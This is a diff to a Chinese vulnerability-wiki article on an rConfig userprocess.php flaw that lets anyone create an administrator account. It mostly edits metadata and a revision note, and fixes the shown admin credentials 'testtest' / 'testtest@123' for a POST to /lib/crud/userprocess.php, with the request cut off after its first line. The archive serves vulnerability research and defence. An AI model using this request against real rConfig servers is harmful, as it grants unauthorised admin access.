@@ -1,5 +1,5 @@
 ---
-version: "rConfig"
+version: "unknown"
 source: "Threekiii/Vulnerability-Wiki"
 id: "vw-0ad988e5993943a4f542dfc2"
 entity_id: "ve-0ad988e5993943a4f542dfc2"
@@ -19,9 +19,12 @@ archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bff
 review_date: "2026-10-02"
 side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
 source_status: "unknown"
+previous_version: "rConfig"
 ---
 
 # rConfig userprocess.php 任意用户创建漏洞
+
+> 版本字段校订（2026-10-04）：误填的版本字段原值逐字保存到对应 `previous_*` 字段。当前值区分正文声称的影响范围、实验环境与尚未知的范围；后文对该元数据误填的旧说明只描述校订前状态，未据此升级来源结论。
 
 <!-- article-review:devices:begin -->
 ## 技术校订与证据边界（2026-10-02）
@@ -323,7 +326,7 @@ $process = new Process;
 
 出现漏洞的原因是对权限设定错误，任何人都可以通过访问这个文件创建管理员用户
 
-发送如下请求包创建管理员用户 testtest，密码为 testtest[@123 ]() 
+发送如下请求包创建管理员用户 testtest，密码为 testtest@123 
 
 ```http
 POST /lib/crud/userprocess.php HTTP/1.1
